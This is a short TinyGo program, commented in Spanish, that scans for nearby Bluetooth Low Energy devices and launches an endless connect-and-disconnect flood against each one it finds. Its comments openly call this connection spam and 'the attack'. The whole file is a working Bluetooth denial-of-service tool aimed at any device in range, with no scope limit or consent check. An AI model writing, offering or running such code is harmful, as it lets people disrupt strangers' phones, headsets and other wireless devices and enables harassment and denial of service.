package main

import (
	"machine"
	"time"
	"tinygo.org/x/bluetooth"
)

var adapter = bluetooth.DefaultAdapter

func main() {
	// Habilitamos el Bluetooth
	must("enable BLE stack", adapter.Enable())

	// Escaneo de dispositivos
	println("Escaneando dispositivos Bluetooth cercanos...")
	adapter.Scan(func(adapter *bluetooth.Adapter, device bluetooth.ScanResult) {
		println("Encontrado:", device.Address.String(), "RSSI:", device.RSSI)

		// Intentar conexión falsa
		go flood(device.Address)
	})

	select {} // Mantener el programa corriendo
}

func flood(address bluetooth.Address) {
	for {
		device, err := adapter.Connect(address, bluetooth.ConnectionParams{})
		if err != nil {
			println("Error conectando a:", address.String(), err)
		} else {
			println("Conectado a", address.String(), "¡Spam de conexiones!")
			device.Disconnect()
		}
		time.Sleep(100 * time.Millisecond) // Controlamos la velocidad del ataque
	}
}

func must(action string, err error) {
	if err != nil {
		panic("Error en" + action + ":" + err.Error())
	}
}
